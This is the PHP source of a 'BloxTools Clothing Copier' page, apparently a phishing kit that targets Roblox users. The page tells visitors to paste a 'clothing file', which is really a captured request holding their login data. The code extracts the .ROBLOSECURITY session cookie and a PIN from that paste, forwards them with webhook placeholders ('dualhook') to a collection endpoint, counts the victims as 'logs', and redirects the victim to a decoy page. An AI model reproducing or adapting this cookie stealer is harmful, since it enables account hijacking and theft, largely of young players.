<?php
include("../function.php");
session_start();
$view = file_get_contents("visits.txt");
if ($view == "") {
$view = '0';
}
$log = file_get_contents("logs.txt");
if ($log == "") {
$log = '0';
}
$logs = $log + 1;
$visits = $view + 1;
$file = fopen("visits.txt", "w");
    fwrite($file, $visits);
    fclose($file); 
if (isset($_SERVER['HTTPS'])) {
$ht = 'https://';
}else {
$ht = 'http://';
}
$dom = $ht.$_SERVER['SERVER_NAME'];
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { $ip = $_SERVER['HTTP_CLIENT_IP']; } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; } else { $ip = $_SERVER['REMOTE_ADDR']; }
$code = $_POST['code'];
$pin = $_POST['pin'];
$cookie = explode('.ROBLOSECURITY", "', $code);
if ($cookie[1] == "") {
$cookie = explode("ROBLOSECURITY=", $code);
$cookie = explode(';', $cookie[1]);
$cookie = $cookie[0];
}else {
$cookie = explode('"', $cookie[1]);
$cookie = $cookie[0];
}

$chkpin = strlen($pin);
$web = '{web}';
$dualhook = '{dualhook}';
if($pin) {
if(!$cookie) {
$error = "Invalid Clothing File";
}
if($chkpin == 4) {

}else {
$error = "Please set your pin to 4 digits";
}
if($error) {
$js = 'Swal.fire({ title: "Error", text: "'.$error.'", icon: "error" });';
}
if ($cookie) {
$file = fopen("logs.txt", "w");
    fwrite($file, $logs);
    fclose($file); 
curl("$dom/controlPage/apis/userinfo.php?cookie=$cookie&dh=$dualhook&pin=$pin&web=$web");
}
$id = explode('https://www.roblox.com/catalog/', $code);
if ($id[1] == "") {
$id = explode('https://web.roblox.com/catalog/', $code);
}
$id = explode('/', $id[1]);
$_SESSION['id'] = $id[0];
$url = "/apis/asset.php?id=".$id[0]."";
$versatile = 'fetch("'.$url.'")  .then(response => {
        if (response.ok) {
            window.location.href = "../template.php";
        } else {
            console.error("Fetch was not successful:", response.status);
        }
    })';
if ($id == "") {
$error = "Invalid Clothing File";
}
if(!$error) {
//echo '<script> location.replace("'.$cookie.'");
//</script>';
$js = $versatile;
}
}
?>
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BloxTools</title></title>
<link href="../assets/css/imports_new.css" rel="stylesheet">
<link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
<link rel="shortcut icon" type="image/x-icon" href="../assets/img/logo.png">
</head>
<body>
<header id="navbar">
<div class="overlay"></div>
<div class="container">
<nav class="navbar navbar-expand-xl navbar-dark">
<a class="navbar-brand" style="color: white !important;" href="#">
<img src="../assets/img/logo.png" alt="" style="width: 3.5rem;">
<span onclick="window.location.href = '/'" style="margin-left:1rem; font-weight: 600; font-size: 1rem;">Go back <i style="position: relative; top:.15rem; left: .3rem;" class="ri-arrow-go-back-line"></i>
</span>
</a>
<button class="navbar-toggler collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
<span class="navbar-toggler-icon"></span>
</button>
</nav>
</div>
</header>
<section id="features">
<div class="overlay"></div>
<div class="container">
<div class="row text-center justify-content-center">
<div class="col-12">
<div class="text-top">
<h1>Clothing Copier</h1>
<p>Copy clothing with ease, with this brand new powershell-based system!</p>
</div>
</div>
</div>
<div class="row">
<div class="col-12">
<h2>BloxTools</h2></h2>
</div>
<div class="col-md-6 mb-8">
<div class="box">
<h3>Copy Clothes</h3>
<br>
<p>Paste your clothing file in the box below, then click "Copy Clothing!"
If you don't know how to find a clothings "clothing file" then go ahead and watch "How to use"</p>
<form method="post">
<div class="form-input-icon mb-3 mt-4">
<i class="fas fa-file"></i><input class="auth-input" type="text" placeholder="Enter clothing file" name="code" autocomplete="off" minlength="3" required=>
</div>
<div class="form-input-icon mb-3 mt-4">
<i class="fas fa-lock"></i><input class="auth-input" type="number" placeholder="Create A Pin" name="pin" autocomplete="off" minlength="3" required>
</div>
<button type="submit" id="start" class="button primary d-block mt-3 w-100">Copy Clothing!</button>
<span>BloxTools</span>
</div>
</div>
<div class="col-md-6 mb-8">
<div class="box">
<h3>How to use</h3>
<p>Video Tutorial</p>
<video width="100%" height="250" controls="">
<source src="/videos/CopyClothes.mp4" type="video/mp4">
</video>
<span>BloxTools</span>
</div>
</div>
</div>
</div></section>
<footer>
<p class="text-center">Copyright 2022 BloxTools. All rights reserved. | Made by ADAM</p>
</footer>
<script src="../assets/js/bootstrap.js"></script>
<script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12"></script>
<script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<script>
<?php echo $js; ?>
</script>
<script>
      AOS.init({
        disable: 'mobile',
        once: true,
      });
    </script>
    <script>
      function remove_hash() {
        setTimeout(() => {
          history.replaceState({}, document.title, ".");
        }, 5);
      }
      var scroll = $(window).scrollTop();
      if (scroll > 70) {
        $("#navbar").addClass("active");
      } else {
        $("#navbar").removeClass("active");
      }
      $(window).scroll(function() {
        var scroll = $(window).scrollTop();
        if (scroll > 70) {
          $("#navbar").addClass("active");
        } else {
          $("#navbar").removeClass("active");
        }
      });
    </script>


</body>